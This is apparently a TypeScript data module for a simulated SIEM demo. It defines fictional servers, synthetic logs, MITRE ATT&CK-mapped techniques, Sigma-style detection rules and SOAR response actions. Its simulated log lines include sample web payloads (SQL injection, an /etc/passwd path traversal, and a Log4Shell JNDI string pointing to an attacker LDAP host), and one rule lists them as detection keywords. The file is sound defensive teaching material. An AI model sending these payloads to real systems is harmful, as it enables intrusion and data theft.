// Simulated SIEM data model used by the 3D SIEM architecture canvas.
// Everything here is fictional demo data (hosts, IPs, logs) — no real telemetry.

export type ServerKey = "web" | "bastion" | "dc" | "db" | "fw";
export type ParserKey = "grok" | "geoip" | "intel";
export type RuleKey = "bruteforce" | "webattack" | "recon" | "c2";
export type DashKey = "alerts" | "top" | "mitre";
export type ActionKey = "fwblock" | "isolate" | "case";

export const rnd = (min: number, max: number) => Math.floor(Math.random() * (max - min + 1)) + min;
export const pick = <T,>(arr: readonly T[]): T => arr[Math.floor(Math.random() * arr.length)];
export const nowTs = () => new Date().toLocaleTimeString("en-GB", { hour12: false });
export const fmtK = (n: number) => (n >= 1000 ? `${(n / 1000).toFixed(1)}k` : String(n));

let seq = 0;
export const nextId = () => ++seq;

// ---------------------------------------------------------------------------
// LOG SOURCES (monitored assets)
// ---------------------------------------------------------------------------
export interface LogSourceServer {
  id: ServerKey;
  hostname: string;
  ip: string;
  os: string;
  role: string;
  agent: string;
  product: string;
  module: string;
  logs: string[];
  baseEps: number;
}

export const SERVER_KEYS: ServerKey[] = ["web", "bastion", "dc", "db", "fw"];

export const SERVERS: Record<ServerKey, LogSourceServer> = {
  web: {
    id: "web",
    hostname: "web-prod-01",
    ip: "10.0.1.12",
    os: "Ubuntu 22.04 LTS",
    role: "Public web server (Nginx + ModSecurity WAF)",
    agent: "Filebeat 8.x (nginx module)",
    product: "nginx · modsec",
    module: "nginx",
    logs: ["/var/log/nginx/access.log", "/var/log/nginx/error.log", "/var/log/modsec_audit.log"],
    baseEps: 1450,
  },
  bastion: {
    id: "bastion",
    hostname: "bastion-01",
    ip: "10.0.0.10",
    os: "RHEL 9.4",
    role: "SSH jump host / admin gateway",
    agent: "Auditbeat + rsyslog",
    product: "sshd · auditd",
    module: "system.auth",
    logs: ["/var/log/secure", "/var/log/audit/audit.log"],
    baseEps: 320,
  },
  dc: {
    id: "dc",
    hostname: "dc-01",
    ip: "10.0.0.5",
    os: "Windows Server 2022",
    role: "Active Directory domain controller",
    agent: "Winlogbeat + Sysmon",
    product: "Security.evtx · Sysmon",
    module: "windows.security",
    logs: ["Security (4624, 4625, 4768, 4771)", "Microsoft-Windows-Sysmon/Operational", "Directory Service"],
    baseEps: 980,
  },
  db: {
    id: "db",
    hostname: "db-prod-01",
    ip: "10.0.2.8",
    os: "Debian 12",
    role: "MySQL 8 primary database",
    agent: "Filebeat (mysql module)",
    product: "mysql audit",
    module: "mysql",
    logs: ["/var/log/mysql/error.log", "/var/log/mysql/audit.log"],
    baseEps: 410,
  },
  fw: {
    id: "fw",
    hostname: "fw-edge-01",
    ip: "10.0.0.1",
    os: "pfSense 2.7 + Suricata IDS",
    role: "Perimeter firewall & network IDS",
    agent: "Syslog (UDP/514) + eve.json",
    product: "filterlog · suricata",
    module: "pfsense / suricata",
    logs: ["filterlog (pf)", "/var/log/suricata/eve.json"],
    baseEps: 2100,
  },
};

const INTERNAL_CLIENTS = ["10.0.5.23", "10.0.5.41", "10.0.3.17", "10.0.3.47", "10.0.4.9"];
const USERS = ["j.doe", "a.rahman", "s.putri", "m.lee", "svc_backup", "b.santoso"];

export function benignLog(server: ServerKey): { ip: string; text: string } {
  const ip = pick(INTERNAL_CLIENTS);
  switch (server) {
    case "web": {
      const path = pick(["/", "/api/v1/products", "/api/v1/cart", "/static/app.js", "/health"]);
      return { ip, text: `${ip} "GET ${path} HTTP/1.1" 200 ${rnd(300, 9000)}` };
    }
    case "bastion":
      return { ip, text: `sshd[${rnd(1000, 9999)}]: Accepted publickey for deploy from ${ip} port ${rnd(40000, 60000)}` };
    case "dc":
      return { ip, text: `EventID=4624 LogonType=${pick([2, 3, 10])} User=CORP\\${pick(USERS)} Src=${ip} Status=Success` };
    case "db":
      return { ip, text: `audit: user=app_rw@${ip} db=orders cmd=${pick(["SELECT", "UPDATE", "INSERT"])} rows=${rnd(1, 120)}` };
    case "fw":
      return {
        ip,
        text: `filterlog: pass,out,igb1,tcp,${ip}:${rnd(40000, 60000)} -> ${pick(["142.250.4.100", "151.101.1.69", "104.16.132.229"])}:443`,
      };
  }
}

// ---------------------------------------------------------------------------
// ATTACK TECHNIQUES (MITRE ATT&CK mapped)
// ---------------------------------------------------------------------------
export interface Technique {
  id: string;
  name: string;
  mitre: string;
  tactic: string;
  target: ServerKey;
  rule: RuleKey;
  response: "block" | "isolate";
  activity: string;
  log: (ip: string) => string;
}

export const TECHNIQUES: Technique[] = [
  {
    id: "ssh-bf",
    name: "SSH Brute Force",
    mitre: "T1110.001",
    tactic: "Credential Access",
    target: "bastion",
    rule: "bruteforce",
    response: "block",
    activity: "Hundreds of failed SSH logins for root/admin within seconds.",
    log: (ip) =>
      `sshd[${rnd(1000, 9999)}]: Failed password for ${pick(["root", "admin", "ubuntu", "oracle"])} from ${ip} port ${rnd(30000, 65000)} ssh2`,
  },
  {
    id: "sqli",
    name: "SQL Injection",
    mitre: "T1190",
    tactic: "Initial Access",
    target: "web",
    rule: "webattack",
    response: "block",
    activity: "UNION-based SQL injection payloads against the /product endpoint.",
    log: (ip) => `${ip} "GET /product?id=1'+UNION+SELECT+user(),version()-- HTTP/1.1" 403 [modsec 942100]`,
  },
  {
    id: "lfi",
    name: "Path Traversal",
    mitre: "T1190",
    tactic: "Initial Access",
    target: "web",
    rule: "webattack",
    response: "block",
    activity: "Trying to read /etc/passwd through ../ directory traversal.",
    log: (ip) => `${ip} "GET /download?file=../../../../etc/passwd HTTP/1.1" 403 [modsec 930100]`,
  },
  {
    id: "log4shell",
    name: "Log4Shell Exploit",
    mitre: "T1190",
    tactic: "Initial Access",
    target: "web",
    rule: "webattack",
    response: "block",
    activity: "JNDI lookup injected in User-Agent header (CVE-2021-44228).",
    log: (ip) => `${ip} "GET / HTTP/1.1" 400 UA="\${jndi:ldap://${ip}:1389/Exploit}"`,
  },
  {
    id: "scan",
    name: "Port Scan",
    mitre: "T1046",
    tactic: "Discovery",
    target: "fw",
    rule: "recon",
    response: "block",
    activity: "SYN sweep across 1,000+ TCP ports on the public edge.",
    log: (ip) =>
      `filterlog: block,in,igb0,tcp,${ip}:${rnd(30000, 65000)} -> 203.0.113.10:${pick([22, 23, 445, 1433, 3306, 3389, 5900, 8080])} [S]`,
  },
  {
    id: "spray",
    name: "Password Spray",
    mitre: "T1110.003",
    tactic: "Credential Access",
    target: "dc",
    rule: "bruteforce",
    response: "block",
    activity: "One common password tried against many AD accounts via the RDP gateway.",
    log: (ip) => `EventID=4625 LogonType=3 User=CORP\\${pick(USERS)} Src=${ip} Status=0xC000006A`,
  },
  {
    id: "mysql-bf",
    name: "MySQL Brute Force",
    mitre: "T1110.001",
    tactic: "Credential Access",
    target: "db",
    rule: "bruteforce",
    response: "block",
    activity: "Dictionary attack against the MySQL root account on port 3306.",
    log: (ip) => `[Warning] Access denied for user 'root'@'${ip}' (using password: YES)`,
  },
  {
    id: "c2",
    name: "C2 Beaconing",
    mitre: "T1071.001",
    tactic: "Command and Control",
    target: "fw",
    rule: "c2",
    response: "isolate",
    activity: "Infected workstation ws-fin-07 (10.0.3.47) beaconing every 60s to a C2 server over HTTPS.",
    log: (ip) => `suricata: [1:2027082] ET MALWARE Cobalt Strike Beacon 10.0.3.47:${rnd(49000, 60000)} -> ${ip}:443`,
  },
];

export const TECHNIQUE_BY_ID: Record<string, Technique> = Object.fromEntries(TECHNIQUES.map((t) => [t.id, t]));

// ---------------------------------------------------------------------------
// PIPELINE STAGES, RULES, DASHBOARDS, RESPONSE ACTIONS
// ---------------------------------------------------------------------------
export const PARSER_KEYS: ParserKey[] = ["grok", "geoip", "intel"];
export const PARSERS: Record<ParserKey, { name: string; short: string; tech: string; description: string; specs: string[] }> = {
  grok: {
    name: "Grok / ECS Normalizer",
    short: "Normalize",
    tech: "Logstash grok + dissect",
    description: "Turns raw syslog, JSON and EVTX lines into structured Elastic Common Schema (ECS) fields.",
    specs: ["Patterns: SYSLOGBASE, COMBINEDAPACHELOG, EVTX", "Output: ECS 8.x JSON", "Drop/route: noisy health checks"],
  },
  geoip: {
    name: "GeoIP & ASN Enrichment",
    short: "GeoIP",
    tech: "MaxMind GeoLite2",
    description: "Adds country, city and ASN/ISP to every public source IP so analysts know where traffic originates.",
    specs: ["Fields: source.geo.*, source.as.*", "DB refresh: weekly", "Private ranges skipped (RFC1918)"],
  },
  intel: {
    name: "Threat Intel Lookup",
    short: "Threat Intel",
    tech: "AbuseIPDB · OTX · MISP",
    description: "Checks each public IP against threat intelligence feeds and tags known-bad indicators (IOC).",
    specs: ["Feeds: AbuseIPDB, AlienVault OTX, MISP", "IOC threshold: abuse score ≥ 50%", "Cache TTL: 1h"],
  },
};

export const RULE_KEYS: RuleKey[] = ["bruteforce", "webattack", "recon", "c2"];
export const RULES: Record<RuleKey, { name: string; short: string; mitre: string; tactic: string; severity: string; description: string; logic: string }> = {
  bruteforce: {
    name: "Brute Force / Password Guessing",
    short: "Brute Force",
    mitre: "T1110",
    tactic: "Credential Access",
    severity: "High",
    description: "Many authentication failures from one source in a short window (SSH, AD, MySQL).",
    logic: `title: Multiple Auth Failures From Single Source
logsource: [linux/auth, windows/security, mysql]
detection:
  selection:
    event.category: authentication
    event.outcome: failure
  timeframe: 60s
  condition: selection | count() by source.ip > 5
level: high`,
  },
  webattack: {
    name: "Web Application Attack",
    short: "Web Attack",
    mitre: "T1190",
    tactic: "Initial Access",
    severity: "High",
    description: "SQLi, path traversal and JNDI payloads detected in HTTP requests or WAF audit logs.",
    logic: `title: Web Exploit Payload In Request
logsource: [nginx/access, modsecurity]
detection:
  keywords:
    url.original|contains: ["UNION SELECT", "../", "\${jndi:"]
  waf:
    modsec.rule_id: [942100, 930100, 944150]
  condition: keywords or waf
level: high`,
  },
  recon: {
    name: "Network Reconnaissance",
    short: "Recon / Scan",
    mitre: "T1046",
    tactic: "Discovery",
    severity: "Medium",
    description: "Single source touching many destination ports in a short time (port scanning).",
    logic: `title: Horizontal / Vertical Port Scan
logsource: [pfsense/filterlog]
detection:
  selection:
    event.action: block
  timeframe: 30s
  condition: selection | count(destination.port) by source.ip > 50
level: medium`,
  },
  c2: {
    name: "C2 Beaconing",
    short: "C2 Beacon",
    mitre: "T1071.001",
    tactic: "Command and Control",
    severity: "Critical",
    description: "IDS malware signatures plus periodic outbound connections with low jitter.",
    logic: `title: Possible C2 Beacon
logsource: [suricata/eve, sysmon/3]
detection:
  ids:
    alert.category: "A Network Trojan was detected"
  beacon:
    interval_jitter: < 10%
  condition: ids or beacon
level: critical`,
  },
};

export const DASH_KEYS: DashKey[] = ["alerts", "top", "mitre"];
export const DASHES: Record<DashKey, { name: string; short: string; description: string }> = {
  alerts: { name: "Live Alert Queue", short: "Live Alerts", description: "Newest correlated alerts waiting for SOC analyst triage." },
  top: { name: "Top Attackers", short: "Top Attackers", description: "Source IPs ranked by number of malicious events observed." },
  mitre: { name: "MITRE ATT&CK Heatmap", short: "MITRE Heatmap", description: "Detected techniques mapped onto the MITRE ATT&CK matrix." },
};

export const ACTION_KEYS: ActionKey[] = ["fwblock", "isolate", "case"];
export const ACTIONS: Record<ActionKey, { name: string; short: string; tech: string; description: string }> = {
  fwblock: {
    name: "Firewall Auto-Block",
    short: "FW Auto-Block",
    tech: "pfSense API · fw-edge-01",
    description: "Pushes a /32 DROP rule for the attacker IP to the perimeter firewall after repeated alerts.",
  },
  isolate: {
    name: "EDR Host Isolation",
    short: "EDR Isolate",
    tech: "Wazuh active-response / EDR API",
    description: "Network-isolates a compromised endpoint while keeping it reachable for forensics.",
  },
  case: {
    name: "Case & Notify",
    short: "Case & Notify",
    tech: "TheHive · Slack #soc-alerts",
    description: "Opens or updates an incident case and notifies the on-call SOC analyst.",
  },
};

// ---------------------------------------------------------------------------
// ATTACKERS
// ---------------------------------------------------------------------------
const GEO = [
  { cc: "RU", country: "Russia", asn: "AS49505 Selectel" },
  { cc: "CN", country: "China", asn: "AS4134 Chinanet" },
  { cc: "NL", country: "Netherlands", asn: "AS14061 DigitalOcean" },
  { cc: "BR", country: "Brazil", asn: "AS28573 Claro NXT" },
  { cc: "US", country: "United States", asn: "AS16509 Amazon AWS" },
  { cc: "VN", country: "Vietnam", asn: "AS7552 Viettel" },
  { cc: "DE", country: "Germany", asn: "AS24940 Hetzner" },
  { cc: "IN", country: "India", asn: "AS9829 BSNL" },
  { cc: "KR", country: "South Korea", asn: "AS4766 Korea Telecom" },
  { cc: "RO", country: "Romania", asn: "AS9009 M247" },
];

const FIRST_OCTETS = [5, 23, 31, 45, 61, 77, 89, 91, 103, 112, 141, 159, 167, 176, 178, 185, 193, 194, 212, 218, 222];
export const randomPublicIp = () => `${pick(FIRST_OCTETS)}.${rnd(1, 254)}.${rnd(0, 255)}.${rnd(1, 254)}`;

export interface AttackerState {
  slot: number;
  ip: string;
  cc: string;
  country: string;
  asn: string;
  reputation: number;
  techniqueId: string;
  status: "active" | "blocked";
  events: number;
  alerts: number;
  firstSeen: string;
  blockedAt: number;
}

/** Number of correlated alerts from one IP before SOAR auto-blocks it. */
export const BLOCK_AFTER = 2;

export function spawnAttacker(slot: number, others: AttackerState[]): AttackerState {
  const usedTech = new Set(others.filter((o) => o.slot !== slot).map((o) => o.techniqueId));
  const pool = TECHNIQUES.filter((t) => !usedTech.has(t.id));
  const tech = pick(pool.length ? pool : TECHNIQUES);
  const geo = pick(GEO);
  return {
    slot,
    ip: randomPublicIp(),
    cc: geo.cc,
    country: geo.country,
    asn: geo.asn,
    reputation: rnd(35, 100),
    techniqueId: tech.id,
    status: "active",
    events: 0,
    alerts: 0,
    firstSeen: nowTs(),
    blockedAt: 0,
  };
}

// ---------------------------------------------------------------------------
// SIMULATION STATE
// ---------------------------------------------------------------------------
export type LogType = "RAW" | "ENRICH" | "ALERT" | "SOAR" | "INFO";

export interface LogLine {
  id: number;
  ts: string;
  type: LogType;
  host: string;
  text: string;
  malicious: boolean;
  ip?: string;
}

export interface AlertEntry {
  id: number;
  ts: string;
  rule: RuleKey;
  techniqueId: string;
  ip: string;
  host: string;
}

export interface ActionEntry {
  id: number;
  ts: string;
  action: ActionKey;
  text: string;
}

export interface SimState {
  serverEvents: Record<ServerKey, number>;
  serverEps: Record<ServerKey, number>;
  parsed: number;
  enriched: number;
  iocHits: number;
  ruleHits: Record<RuleKey, number>;
  dashboardEvents: number;
  alerts: number;
  blocked: number;
  isolated: number;
  cases: number;
  attackers: AttackerState[];
  logs: LogLine[];
  alertsFeed: AlertEntry[];
  actionsFeed: ActionEntry[];
  lastNormalized: Record<string, string | number> | null;
  techniqueCounts: Record<string, number>;
  ipStats: Record<string, { ip: string; cc: string; events: number; techniqueId: string }>;
}

/** Deterministic initial state (safe for SSR hydration — attackers are spawned on the client). */
export function createSimState(): SimState {
  const zeroServers = () => ({ web: 0, bastion: 0, dc: 0, db: 0, fw: 0 });
  return {
    serverEvents: zeroServers(),
    serverEps: { web: 1450, bastion: 320, dc: 980, db: 410, fw: 2100 },
    parsed: 0,
    enriched: 0,
    iocHits: 0,
    ruleHits: { bruteforce: 0, webattack: 0, recon: 0, c2: 0 },
    dashboardEvents: 0,
    alerts: 0,
    blocked: 0,
    isolated: 0,
    cases: 0,
    attackers: [],
    logs: [],
    alertsFeed: [],
    actionsFeed: [],
    lastNormalized: null,
    techniqueCounts: {},
    ipStats: {},
  };
}
